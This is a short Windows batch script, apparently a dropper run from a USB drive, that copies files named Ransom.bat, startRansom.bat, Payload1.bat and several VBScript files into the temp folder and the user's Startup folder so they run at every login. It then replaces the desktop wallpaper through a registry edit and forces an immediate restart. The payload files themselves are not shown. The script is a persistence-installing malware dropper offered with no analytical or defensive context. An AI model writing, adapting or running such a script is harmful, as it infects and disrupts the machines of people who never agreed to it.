copy "D:\be.mp3" "%USERPROFILE%"
copy "D:\mi.vbs" "%USERPROFILE%"
copy "D:\booger (4).jpg" "%TEMP%"
copy "D:\scream.mp3" "%USERPROFILE%"
copy "D:\bb.txt" "%TEMP%"
copy "D:\Ransom.bat" "%TEMP%"
copy "D:\startRansom.bat" "%TEMP%"
copy "D:\up.bat" "%TEMP%"
copy "D:\deez.vbs" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "D:\funni.mp3" "%USERPROFILE%"
copy "D:\Payload1.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "D:\Baller.bat" "%USERPROFILE%"
copy "D:\RS.vbs" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"



cd /d C:\

cd %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

attrib -s -h RS.vbs

cd %USERPROFILE%
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\booger (4).jpg" /f
shutdown /r /t 1
exit